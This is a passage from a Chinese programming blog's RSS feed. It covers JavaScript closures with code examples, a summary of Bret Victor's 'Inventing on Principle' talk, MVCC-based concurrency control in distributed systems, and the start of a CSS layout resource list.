<li><strong>闭包就是就是函数的“堆栈”在函数返回后并不释放，我们也可以理解为这些函数堆栈并不在栈上分配而是在堆上分配</strong></li>
<li><strong>当在一个函数内定义另外一个函数就会产生闭包</strong></li>
</ul>
<p>上面的第二定义是第一个补充说明，抽取第一个定义的主谓宾——闭包是<strong>函数的‘局部变量’集合</strong>。只是这个局部变量是可以在函数返回后被访问。（这个不是官方定义，但是这个定义应该更有利于你理解闭包）</p>
<p>做为局部变量都可以被函数内的代码访问，这个和静态语言是没有差别。闭包的差别在于局部变变量可以在函数执行结束后仍然被函数外的代码访问。这意味着函数必须返回一个指向闭包的“引用”，或将这个”引用”赋值给某个外部变量，才能保证闭包中局部变量被外部代码访问。当然包含这个引用的实体应该是一个对象，因为在Javascript中除了基本类型剩下的就都是对象了。可惜的是，ECMAScript并没有提供相关的成员和方法来访问闭包中的局部变量。但是在ECMAScript中，函数对象中定义的<strong>内部函数(inner function)</strong>是可以直接访问外部函数的局部变量，通过这种机制，我们就可以以如下的方式完成对闭包的访问了。</p>
<p><span id="more-6731"></span></p>
<p>[javascript]<br>
function greeting(name) {<br>
var text = ‘Hello ‘ + name; // local variable<br>
// 每次调用时，产生闭包，并返回内部函数对象给调用者<br>
return function() { alert(text); }<br>
}<br>
var sayHello=greeting("Closure");<br>
sayHello() // 通过闭包访问到了局部变量text<br>
[/javascript]</p>
<p>上述代码的执行结果是：Hello Closure，因为sayHello()函数在greeting函数执行完毕后，仍然可以访问到了定义在其之内的局部变量text。</p>
<p>好了，这个就是传说中闭包的效果，闭包在Javascript中有多种应用场景和模式，比如Singleton，Power Constructor等这些Javascript模式都离不开对闭包的使用。</p>
<h4>
<span class="ez-toc-section" id="ECMAScript%E9%97%AD%E5%8C%85%E6%A8%A1%E5%9E%8B"></span><strong><span style="color: #008000">ECMAScript闭包模型</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>ECMAScript到底是如何实现闭包的呢？想深入了解的亲们可以获取<a href="https://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf">ECMAScript 规范</a>进行研究，我这里也只做一个简单的讲解，内容也是来自于网络。</p>
<p>在ECMAscript的脚本的函数运行时，每个函数关联都有一个执行上下文场景(Execution Context) ，这个执行上下文场景中包含三个部分</p>
<ul>
<li>文法环境（The LexicalEnvironment）</li>
<li>变量环境（The VariableEnvironment）</li>
<li>this绑定</li>
</ul>
<p>其中第三点this绑定与闭包无关，不在本文中讨论。文法环境中用于解析函数执行过程使用到的变量标识符。我们可以将文法环境想象成一个对象，该对象包含了两个重要组件，环境记录(Enviroment Recode)，和外部引用(指针)。环境记录包含包含了函数内部声明的局部变量和参数变量，外部引用指向了外部函数对象的上下文执行场景。全局的上下文场景中此引用值为NULL。这样的数据结构就构成了一个单向的链表，每个引用都指向外层的上下文场景。</p>
<p>例如上面我们例子的闭包模型应该是这样，sayHello函数在最下层，上层是函数greeting，最外层是全局场景。如下图：<br>
<img alt="image placeholder" ><br>
因此当sayHello被调用的时候，sayHello会通过上下文场景找到局部变量text的值，因此在屏幕的对话框中显示出”Hello Closure”<br>
变量环境(The VariableEnvironment)和文法环境的作用基本相似，具体的区别请参看ECMAScript的规范文档。</p>
<h4>
<span class="ez-toc-section" id="%E9%97%AD%E5%8C%85%E7%9A%84%E6%A0%B7%E5%88%97"></span><strong><span style="color: #008000">闭包的样列</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>前面的我大致了解了Javascript闭包是什么，闭包在Javascript是怎么实现的。下面我们通过针对一些例子来帮助大家更加深入的理解闭包，下面共有5个样例，例子来自于<a href="http://blog.morrisjohns.com/javascript_closures_for_dummies.html">JavaScript Closures For Dummies(</a><a href="https://web.archive.org/web/20080209105120/http://blog.morrisjohns.com/javascript_closures_for_dummies">镜像</a><a href="http://blog.morrisjohns.com/javascript_closures_for_dummies.html">)</a>。<br>
<strong>例子1:闭包中局部变量是引用而非拷贝</strong></p>
<p>[javascript]<br>
function say667() {<br>
// Local variable that ends up within closure<br>
var num = 666;<br>
var sayAlert = function() { alert(num); }<br>
num++;<br>
return sayAlert;<br>
}</p>
<p>var sayAlert = say667();<br>
sayAlert()<br>
[/javascript]</p>
<p>因此执行结果应该弹出的667而非666。</p>
<p><strong>例子2：多个函数绑定同一个闭包，因为他们定义在同一个函数内。</strong></p>
<p>[javascript]<br>
function setupSomeGlobals() {<br>
// Local variable that ends up within closure<br>
var num = 666;<br>
// Store some references to functions as global variables<br>
gAlertNumber = function() { alert(num); }<br>
gIncreaseNumber = function() { num++; }<br>
gSetNumber = function(x) { num = x; }<br>
}<br>
setupSomeGlobals(); // 为三个全局变量赋值<br>
gAlertNumber(); //666<br>
gIncreaseNumber();<br>
gAlertNumber(); // 667<br>
gSetNumber(12);//<br>
gAlertNumber();//12<br>
[/javascript]</p>
<p><strong>例子3：当在一个循环中赋值函数时，这些函数将绑定同样的闭包</strong></p>
<p>[javascript]<br>
function buildList(list) {<br>
var result = [];<br>
for (var i = 0; i &lt; list.length; i++) {<br>
var item = ‘item’ + list[i];<br>
result.push( function() {alert(item + ‘ ‘ + list[i])} );<br>
}<br>
return result;<br>
}</p>
<p>function testList() {<br>
var fnlist = buildList([1,2,3]);<br>
// using j only to help prevent confusion – could use i<br>
for (var j = 0; j &lt; fnlist.length; j++) {<br>
fnlist[j]();<br>
}<br>
}<br>
[/javascript]</p>
<p>testList的执行结果是弹出item3 undefined窗口三次，因为这三个函数绑定了同一个闭包，而且item的值为最后计算的结果，但是当i跳出循环时i值为4，所以list[4]的结果为undefined.</p>
<p><strong>例子4：外部函数所有局部变量都在闭包内，即使这个变量声明在内部函数定义之后。</strong></p>
<p>[javascript]<br>
function sayAlice() {<br>
var sayAlert = function() { alert(alice); }<br>
// Local variable that ends up within closure<br>
var alice = ‘Hello Alice’;<br>
return sayAlert;<br>
}<br>
var helloAlice=sayAlice();<br>
helloAlice();<br>
[/javascript]</p>
<p>执行结果是弹出”Hello Alice”的窗口。即使局部变量声明在函数sayAlert之后，局部变量仍然可以被访问到。</p>
<p><strong>例子5：每次函数调用的时候创建一个新的闭包</strong></p>
<p>[javascript]<br>
function newClosure(someNum, someRef) {<br>
// Local variables that end up within closure<br>
var num = someNum;<br>
var anArray = [1,2,3];<br>
var ref = someRef;<br>
return function(x) {<br>
num += x;<br>
anArray.push(num);<br>
alert(‘num: ‘ + num +<br>
‘\nanArray ‘ + anArray.toString() +<br>
‘\nref.someVar ‘ + ref.someVar);<br>
}<br>
}<br>
closure1=newClosure(40,{someVar:’closure 1′});<br>
closure2=newClosure(1000,{someVar:’closure 2′});</p>
<p>closure1(5); // num:45 anArray[1,2,3,45] ref:’someVar closure1′<br>
closure2(-10);// num:990 anArray[1,2,3,990] ref:’someVar closure2’<br>
[/javascript]</p>
<h4>
<span class="ez-toc-section" id="%E9%97%AD%E5%8C%85%E7%9A%84%E5%BA%94%E7%94%A8"></span><strong><span style="color: #008000">闭包的应用</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p><strong>Singleton 单件：</strong></p>
<p>[javascript]<br>
var singleton = function () {<br>
var privateVariable;<br>
function privateFunction(x) {<br>
…privateVariable…<br>
}</p>
<p> return {<br>
firstMethod: function (a, b) {<br>
…privateVariable…<br>
},<br>
secondMethod: function (c) {<br>
…privateFunction()…<br>
}<br>
};<br>
}();<br>
[/javascript]</p>
<p>这个单件通过闭包来实现。通过闭包完成了私有的成员和方法的封装。匿名主函数返回一个对象。对象包含了两个方法，方法1可以方法私有变量，方法2访问内部私有函数。需要注意的地方是匿名主函数结束的地方的'()’，如果没有这个'()’就不能产生单件。因为匿名函数只能返回了唯一的对象，而且不能被其他地方调用。这个就是利用闭包产生单件的方法。</p>
<h2><strong><span style="color: #008000">参考：</span></strong></h2>
<p><a href="http://blog.morrisjohns.com/javascript_closures_for_dummies.html">JavaScript Closures For Dummies(</a><a href="https://web.archive.org/web/20080209105120/http://blog.morrisjohns.com/javascript_closures_for_dummies">镜像</a><a href="http://blog.morrisjohns.com/javascript_closures_for_dummies.html">)</a> 可惜都被墙了。<br>
<a href="http://yuiblog.com/blog/2006/11/27/video-crockford-advjs/">Advance Javascript</a> （Douglas Crockford 大神的视频，一定要看啊）</p>
 ]]></content>
<pubDate>2012-03-07T08:30:43+08:00</pubDate>
<guid>https://coolshell.cn/articles/6731.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Bret Victor – Inventing on Principle ]]></title>
<link>https://coolshell.cn/articles/6775.html</link>
<content><![CDATA[ 
<p><a href="http://worrydream.com" target="_blank">Bret Victor</a>（<a href="http://worrydream.com/#!/cv/bret_victor_resume.pdf" target="_blank">简历</a>） – 苹果公司的UI交互设计师（大神级的人），在 <a href="http://cusec.net" target="_blank">CUSEC</a>（<em>Canadian University Software Engineering Conference</em>） 上做了一个题为 “Inventing on Principle” 的演讲（<a href="https://vimeo.com/36579366" target="_blank">vimeo视频链接</a>），这个演讲中展示了五个示例：</p>
<ul>
<li>用程序画树。如何把程序绘图变成实时的，如何把程序和图映射起来。</li>
<li>游戏调试。在实时编程的基础上，可以更容易的让你看到程序参数对游戏的调整，甚至对游戏过程的可视化调试。</li>
<li>算法调试。在写二分查找算法时可以实时看到程序的执行过程。边写边看到。</li>
<li>电路图。可以实时地看到电路图中各个部件的对1/0信号的处理。</li>
<li>动画。一种比flash制作动画更NB 的方法。</li>
</ul>
<p>下面是优酷上的视频——你一定会被示例中的那些编程工具所震撼！</p>
<p></p>
<center><embed src="http://player.youku.com/player.php/sid/XMzUyOTIyNzg0/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash"></embed></center>
<p>不过，Bret并不是在说什么编程，也不是在说什么技术，他是在说 How to live your life。</p>
<p><span id="more-6775"></span></p>
<p>他认为，在我们的生活当中，我们听到太多的诸如：“跟随你的喜好”、“跟随你的兴趣”，“跟随你的热情”之类的东西，但他更认为，更应该是“跟随一个原则 follow you principle”，他认为真正能让你把事做正确的不是你的喜好，不是你的兴趣，也不是热情，而一个做事的原则。在这个演讲中Bret介绍了他自己的原则和他人的原则，供你参考和并找到你的原则从而live in your life。</p>
<p>Bret的原则是，他觉得人总是会有很多想法，而把这些想法变成现实是一件非常重要的事，也是最难的事。他觉得当我们在写代码实现一个东西的时候，在实现一个游戏，算法，电路，动画的时候，人很难把自己脑海里的东西映射成现实的东西，因为一个想法变成现实，需要反反复复的调整，如果看不见，就没办法调整。而我们在写好程序，需要编译程序，运行程序，才能看到结果，之后，有些东西发现并不满意，需要做调整，于是需要猜着去改一下程序，再编译运行，再看结果，于是，这个调整的过程相当令人痛苦，因为代码里的那些数字，我需要一点一点地去试，调大调小，总是不能调到我们想要的结果，从而让人无法正常思考。所以，他的原则是——<strong>创造者需要对自己的创造的东西有实时的反馈</strong>。于是出现了视频中的实时编程的那些示例。（其实，这个东西和Firebug很相似，我还记得以前和朋友说过，如果写C/C++程序也能有像Firebug的这种工具就好了，现在果然离实现不远了）</p>
<p>Bret说起他的动机的时候，他说，他把这个事当成了一种责任而不是一种机会。他说，这就好像我们听到的：审查机制，性别歧视，环境破坏，违反人权等这些问题，绝大多数人是不会把这些事当成一个机会的，而那些有责任感的人会把解决这些问题当作一种责任。同样，当他看到我们被工具或环境限制住了我们创造东西的过程时，他并不觉得这是一个可以发明更好的产品的机会，甚至这是开创自己事业的机会，或是对社会做贡献的机会。他认为想法相当的宝贵，如果一个好的想法推动不了的时候，他会很难受，就像看到一场灾难一样，他觉得，让大家的想法能够顺的进行，这是他的一个责任。</p>
<p>后面他，举到了很多人的例子，</p>
<p style="padding-left: 30px;"><a href="https://en.wikipedia.org/wiki/Larry_Tesler" target="_blank">Larry Tesler</a> – 著名的计算机科学家，前苹果的首席科学家，图形界面的创造者（在“<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">SteveY对Amazon和Google平台的长篇大论</a>”中提到过他）。他在70年代看到人们在使用电脑文本编辑器时，需要按某个键进入某种模式（Mode），然后才能输入（VI）。他觉得这样操作起来很复杂，也很不舒服，所以，他为自己设定了一个原则——“Don’t Mode Me In”，他做了很多尝试，做了一个叫Gypsy的文档编辑器，可以通过拖拽移动字符，而且他还发明了复制粘贴，对于一个没有使用过电脑的人来说，只需半个小时的训练就可以输入文字了。Larry把消除模式设置成了自己的原则或责任。他的个人主页是：http://www.nomodes.com，他的Twitter是 @nomodes，甚至他的车牌也是nomodes.</p>
<p style="padding-left: 30px;"><a href="https://en.wikipedia.org/wiki/Elizabeth_Cady_Stanton" target="_blank">Elizabeth Cady Stanton</a>，100年前的一个美国的女权主义者，当时，她主张妇女的各项权益，比如参与投票，所有人都以为他疯了，今天看来，她是对的，她消除了性别歧视。这和Larry 很相似，他们都看到了一种文化上的错误，并要预见到了未来的样子，他们都为自己设定了一个原则或是信仰，而去为之奋斗。</p>
<p style="padding-left: 30px;"><a href="https://en.wikipedia.org/wiki/Doug_Engelbart" target="_blank">Doug Engelbart</a>，美国发明家，瑞典人和挪威人后裔。最广为人知的是他发明了鼠标，另外他的小组是人机交互的先锋，开发了超文本系统、网络计算机，以及图形用户界面的先驱；并致力于倡导运用计算机和网络，来协同解决世界上日益增长的紧急而又复杂的问题。</p>
<p style="padding-left: 30px;"><a href="https://en.wikipedia.org/wiki/Alan_Kay" target="_blank">Alan Kay</a>，美国计算机科学家，在面向对象编程和窗口式图形用户界面方面作出了先驱性贡献。2003年获得图灵奖。目前担任Viewpoints研究院院长，加州大学伯克利分校兼职教授。曾任Apple公司院士，惠普公司资深院士。他有一句尽人皆知的名言——预测未来的最好办法就是创造未来。他相信如果小孩能够熟练掌握电脑，如果写程序是和读书写字一样成为基础知识，那么人们就掌握了一种新的方式去思考，新的方式去了解世界。他所有发明的东西都基于他自己的原则或信条。</p>
<p style="padding-left: 30px;"><a href="https://en.wikipedia.org/wiki/Richard_Stallman" target="_blank">Richard Stallman</a>，是美国自由软件运动的精神领袖、GNU计划以及自由软件基金会（Free Software Foundation）的创立者。作为一个著名的黑客，他的主要成就包括Emacs及后来的GNU Emacs，GNU C 编译器及GDB 调试器。他所写作的GNU通用公共许可证（GNU GPL）是世上最广为采用的自由软件许可证，为copyleft观念开拓出一条崭新的道路。他的原则，是软件必须是自由的，他认为软件的自由是关乎道义上的对错的，关系到人类的自由。他没车没房没结婚没孩子，也不用手机，但他有非常忠实自由的信条和责任感。</p>
<p>Bret通过这些例子继续强调——他并不是要大家样做，他只是给大家一个选择。你可以成为一个非常优秀的工程师，非常熟练地掌握了一些技术，你也可以为这个社会做很多贡献，这是成为一个工匠的路，也是大多数人走的路。不过旁边还有一条路，值得去走，那就是解决问题的路，这条路往一头走是创业者，往另一头走是学者，但你需要找到一个你自己的原则，你可能需要很长时间才能找到你的原则，Bret说他花了10年才搞清楚他的原则是什么。</p>
<p>个人以为，Bret所说这个原则也好，信条也好，是一种对自己创造力有引导性质的原则和信条，并不是那些已有的原则或信条，否则那只不过是在跟从了，所以，这些原则和信条应该是新的东西，是自己悟出来的东西，这样的原则和信条会导致你有一种责任感向正确的方向去创造。当然，这些原则也不是那些非常笼统和模糊的东西，比如，要创业开公司，要设计出有更好的用户体验的东西，要创造有很多用户使用的产品，或是有更好的收入什么的。其应该是明确的，有指导性的，就像Bret他自己的信条一样——“创造者需要即时的反馈”，就像他演示的那样，当你在一行一行修改你的代码的时候，你可以立即看到代码运行的过程和效果。这个原则可以指导着他要对一切达不到这个原则的东西负责，并引导着他知道应该做什么，不应该做什么，从而去创造新的东西，解决问题。</p>
<p>当然，世界是多元的，每个人都有每个人自己的原则。不同的原则必然会把你导到不同的路上。不管你是否同意，视频中的那些演示是相当令人震撼的。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-03-09T08:38:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/6775.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 多版本并发控制(MVCC)在分布式系统中的应用 ]]></title>
<link>https://coolshell.cn/articles/6790.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;">感谢 Todd投递本文 – 微博帐号：</span><a title="weidagang" href="https://weibo.com/weidagang" target="_blank">weidagang</a> 】</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E9%A2%98" title="问题">问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%881%EF%BC%9A%E5%9F%BA%E4%BA%8E%E9%94%81%E7%9A%84%E4%BA%8B%E5%8A%A1" title="解决方案1：基于锁的事务">解决方案1：基于锁的事务</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%882%EF%BC%9A%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" title="解决方案2：多版本并发控制">解决方案2：多版本并发控制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%82%B2%E8%A7%82%E9%94%81%E5%92%8CMVCC%E5%AF%B9%E6%AF%94" title="悲观锁和MVCC对比">悲观锁和MVCC对比</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90" title="友情推荐">友情推荐</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98"></span>问题<span class="ez-toc-section-end"></span>
</h4>
<p>最近项目中遇到了一个分布式系统的并发控制问题。该问题可以抽象为：某分布式系统由一个数据中心D和若干业务处理中心L1，L2 … Ln组成；D本质上是一个key-value存储，它对外提供基于HTTP协议的CRUD操作接口。L的业务逻辑可以抽象为下面3个步骤：</p>
<ol>
<li>read: 根据keySet {k1, … kn}从D获取keyValueSet {k1:v1, … kn:vn}</li>
<li>do: 根据keyValueSet进行业务处理，得到需要更新的数据集keyValueSet’ {k1′:v1′, … km’:vm’} (<strong>注</strong>：读取的keySet和更新的keySet’可能不同)</li>
<li>update: 把keyValueSet’更新到D （<strong>注</strong>：D保证在一次调用更新多个key的原子性）</li>
</ol>
<p>在没有事务支持的情况下，多个L进行并发处理可能会导致数据一致性问题。比如，考虑L1和L2的如下执行顺序：</p>
<ol>
<li>L1从D读取key:123对应的值100</li>
<li>L2从D读取key:123对应的100</li>
<li>L1将key:123更新为100 + 1</li>
<li>L2将key:123更新为100 + 2</li>
</ol>
<p>如果L1和L2串行执行，key:123对应的值将为103，但上面并发执行中L1的执行效果完全被L2所覆盖，实际key:123所对应的值变成了102。</p>
<p><span id="more-6790"></span></p>
<h4>
<span class="ez-toc-section" id="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%881%EF%BC%9A%E5%9F%BA%E4%BA%8E%E9%94%81%E7%9A%84%E4%BA%8B%E5%8A%A1"></span>解决方案1：基于锁的事务<span class="ez-toc-section-end"></span>
</h4>
<p>为了让L的处理具有可串行化特性(Serializability)，一种最直接的解决方案就是考虑为D加上基于锁的简单事务。让L在进行业务处理前先锁定D，完成以后释放锁。另外，为了防止持有锁的L由于某种原因长时间未提交事务，D还需要具有超时机制，当L尝试提交一个已超时的事务时会得到一个错误响应。</p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p>本方案的优点是实现简单，缺点是锁定了整个数据集，粒度太大；时间上包含了L的整个处理时间，跨度太长。虽然我们可以考虑把锁定粒度降低到数据项级别，按key进行锁定，但这又会带来其他的问题。由于更新的keySet’可能是事先不确定的，所以可能无法在开始事务时锁定所有的key；如果分阶段来锁定需要的key，又可能出现死锁(Deadlock)问题。另外，按key锁定在有锁争用的情况下并不能解决锁定时间太长的问题。所以，按key锁定仍然存在重要的不足之处。</p>
<h4>
<span class="ez-toc-section" id="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%882%EF%BC%9A%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6"></span>解决方案2：多版本并发控制<span class="ez-toc-section-end"></span>
</h4>
<p>为了实现可串行化，同时避免锁机制存在的各种问题，我们可以采用基于多版本并发控制（Multiversion concurrency control，MVCC）思想的无锁事务机制。人们一般把基于锁的并发控制机制称成为悲观机制，而把MVCC机制称为乐观机制。这是因为锁机制是一种预防性的，读会阻塞写，写也会阻塞读，当锁定粒度较大，时间较长时并发性能就不会太好；而MVCC是一种后验性的，读不阻塞写，写也不阻塞读，等到提交的时候才检验是否有冲突，由于没有锁，所以读写不会相互阻塞，从而大大提升了并发性能。我们可以借用源代码版本控制来理解MVCC，每个人都可以自由地阅读和修改本地的代码，相互之间不会阻塞，只在提交的时候版本控制器会检查冲突，并提示merge。目前，Oracle、PostgreSQL和MySQL都已支持基于MVCC的并发机制，但具体实现各有不同。</p>
<p>MVCC的一种简单实现是基于CAS（Compare-and-swap）思想的有条件更新（Conditional Update）。普通的update参数只包含了一个keyValueSet’，Conditional Update在此基础上加上了一组更新条件conditionSet { … data[keyx]=valuex, … }，即只有在D满足更新条件的情况下才将数据更新为keyValueSet’；否则，返回错误信息。这样，L就形成了如下图所示的Try/Conditional Update/(Try again)的处理模式：</p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p>虽然对单个L来讲不能保证每次都成功更新，但从整个系统来看，总是有任务能够顺利进行。这种方案利用Conditional Update避免了大粒度和长时间的锁定，当各个业务之间资源争用不大的情况下，并发性能很好。不过，由于Conditional Update需要更多的参数，如果condition中value的长度很长，那么每次网络传送的数据量就会比较大，从而导致性能下降。特别是当需要更新的keyValueSet’很小，而condition很大时，就显得非常不经济。</p>
<p>为了避免condition太大所带来的性能问题，可以为每条数据项增加一个int型的版本号字段，由D维护该版本号，每次数据有更新就增加版本号；L在进行Conditional Update时，通过版本号取代具体的值。</p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p>另一个问题是上面的解决方案假设了D是可以支持Conditional Update的；那么，如果D是一个不支持Conditional Update的第三方的key-value存储怎么办呢？这时，我们可以在L和D之间增加一个P作为代理，所有的CRUD操作都必须经过P，让P来进行条件检查，而实际的数据操作放在D。这种方式实现了条件检查和数据操作的分离，但同时降低了性能，需要在P中增加cache，提升性能。由于P是D的唯一客户端；所以，P的cache管理是非常简单的，不必像多客户端情形担心缓存的失效。不过，实际上，据我所知redis和Amazon SimpleDB都已经有了Conditional Update的支持。</p>
<h4>
<span class="ez-toc-section" id="%E6%82%B2%E8%A7%82%E9%94%81%E5%92%8CMVCC%E5%AF%B9%E6%AF%94"></span>悲观锁和MVCC对比<span class="ez-toc-section-end"></span>
</h4>
<p>上面介绍了悲观锁和MVCC的基本原理，但是对于它们分别适用于什么场合，不同的场合下两种机制优劣具体表现在什么地方还不是很清楚。这里我就对一些典型的应用场景进行简单的分析。需要注意的是下面的分析不针对分布式，悲观锁和MVCC两种机制在分布式系统、单数据库系统、甚至到内存变量各个层次都存在。</p>
<p>### 场景1：对读的响应速度要求高</p>
<p>有一类系统更新特别频繁，并且对读的响应速度要求很高，如股票交易系统。在悲观锁机制下，写会阻塞读，那么当有写操作时，读操作的响应速度就会受到影响；而MVCC不存在读写锁，读操作是不受任何阻塞的，所以读的响应速度会更快更稳定。</p>
<p>### 场景2：读远多于写</p>
<p>对于许多系统来讲，读操作的比例往往远大于写操作，特别是某些海量并发读的系统。在悲观锁机制下，当有写操作占用锁，就会有大量的读操作被阻塞，影响并发性能；而MVCC可以保持比较高且稳定的读并发能力。</p>
<p>### 场景3：写操作冲突频繁</p>
<p>如果系统中写操作的比例很高，且冲突频繁，这时就需要仔细评估。假设两个有冲突的业务L1和L2，它们在单独执行是分别耗时t1，t2。在悲观锁机制下，它们的总时间大约等于串行执行的时间：</p>
<p>T = t1 + t2</p>
<p>而在MVCC下，假设L1在L2之前更新，L2需要retry一次，它们的总时间大约等于L2执行两次的时间（这里假设L2的两次执行耗时相等，更好的情况是，如果第1次能缓存下部分有效结果，第二次执行L2耗时是可能减小的）：</p>
<p>T’ = 2 * t2</p>
<p>这时关键是要评估retry的代价，如果retry的代价很低，比如，对某个计数器递增，又或者第二次执行可以比第一次快很多，这时采用MVCC机制就比较适合。反之，如果retry的代价很大，比如，报表统计运算需要算几小时甚至一天那就应该采用锁机制避免retry。</p>
<p>从上面的分析，我们可以简单的得出这样的结论：对读的响应速度和并发性要求比较高的场景适合MVCC；而retry代价越大的场景越适合悲观锁机制。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>本文介绍了一种基于多版本并发控制（MVCC）思想的Conditional Update解决分布式系统并发控制问题的方法。和基于悲观锁的方法相比，该方法避免了大粒度和长时间的锁定，能更好地适应对读的响应速度和并发性要求高的场景。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Serializability">Wikipedia – Serializability</a></li>
<li><a href="https://en.wikipedia.org/wiki/Compare-and-swap">Wikipedia – Compare-and-swap</a></li>
<li><a href="https://en.wikipedia.org/wiki/Multiversion_concurrency_control">Wikipedia – Multiversion concurrency control</a></li>
<li><a href="https://blogs.msdn.com/b/oldnewthing/archive/2011/04/12/10152296.aspx">Lock-free algorithms: The try/commit/(try again) pattern</a></li>
<li><a href="https://aws.amazon.com/simpledb/faqs/#Does_Amazon_SimpleDB_support_transactions">Amazon SimpleDB FAQs – Does Amazon SimpleDB support transactions?</a></li>
<li><a href="http://redis.io/topics/transactions">redis – Transactions</a></li>
<li><a href="https://simpledbm.googlecode.com/files/mvcc-survey-1.0.pdf">A Quick Survey of MultiVersion Concurrency Algorithms</a></li>
<li><a href="https://www.cnblogs.com/jobs/archive/2007/11/13/957446.html">非阻塞算法思想在关系数据库应用程序开发中的使用</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90"></span>友情推荐<span class="ez-toc-section-end"></span>
</h4>
<p>本文的图是用我自己开发的<a href="http://textdiagram.sinaapp.com">TextDiagram</a>工具画的，欢迎试用！如果您喜欢，请推荐给朋友，谢谢！</p>
 ]]></content>
<pubDate>2012-03-13T08:36:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/6790.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ CSS 布局:40个教程、技巧、例子和最佳实践 ]]></title>
<link>https://coolshell.cn/articles/6840.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;">感谢 Neo 投递本文 – 微博帐号</span>：<a title="_锟_" href="https://weibo.com/gandalfthegrey" target="_blank">_锟_</a> 】</p>
<p><strong>前言：</strong> 布局是WEB开发一个重要的课题，进入XHTML/CSS后，使用TABLE布局的方式逐渐淡出，CSS布局以众多优点成为主流，本文将介绍40个基于CSS的web布局的资源和教程。文章的出处在<a href="http://www.noupe.com/css/css-layouts-40-tutorials-tips-demos-and-best-practices.html" target="_blank">http://www.noupe.com/css/css-layouts-40-tutorials-tips-demos-and-best-practices.html</a>。文中的不少的例子在一本经典的CSS书籍<a href="http://shop.oreilly.com/product/9780596802455.do">《CCS: The Missing Manual, 2nd Edition》</a>中都可以找到，据我所知，第二版在中国没有翻译出版。你可以从<a href="http://www.itpub.net/forum.php?mod=viewthread&amp;tid=1210179&amp;highlight=CSS%2Bthe%2Bmissing%2Bmanual">这里</a>下载英文版（不过需要注册个用户名）</p>
<p><strong>正文</strong><br>
<strong>基于CSS的布局</strong>能提供更灵活布局方式和更强的用户视觉体验。一些重要技巧和关键点可以帮助初学者理解CSS布局的基础和本质。这也是本文成文的原因 ——找到那些完美的布局，<strong>完全灵活的，等高栏</strong>和工作完美的布局。<br>
因此下面这个列表就是我们整理了网络上关于基于CSS布局的一些技巧，教程和最佳实践的列表。<br>
当然你也可能对下面这些和CSS相关的主题有兴趣：</p>
<p><a href="http://www.noupe.com/css/9-timeless-3-column-layout-techniques.html&gt;9%20Timeless%203%20Column%20Layout%20Techniques&lt;/a&gt;&lt;/ui&gt;&lt;br%20/&gt;%20&lt;ui&gt;&lt;a%20href=">The 7 CSS Hacks that we should use</a><br>
<a href="http://www.noupe.com/css/using-css-to-do-anything-50-creative-examples-and-tutorials.html">Using CSS to Do Anything: 50+ Creative Examples and Tutorials</a><br>
<a href="http://www.noupe.com/css/using-css-to-fix-anything-20-common-bugs-and-fixes.html">Using CSS to Fix Anything: 20+ Common Bugs and Fixes</a></p>
<p><span id="more-6840"></span></p>
<h4><strong><span style="color: #008000;">CSS 布局教程</span></strong></h4>
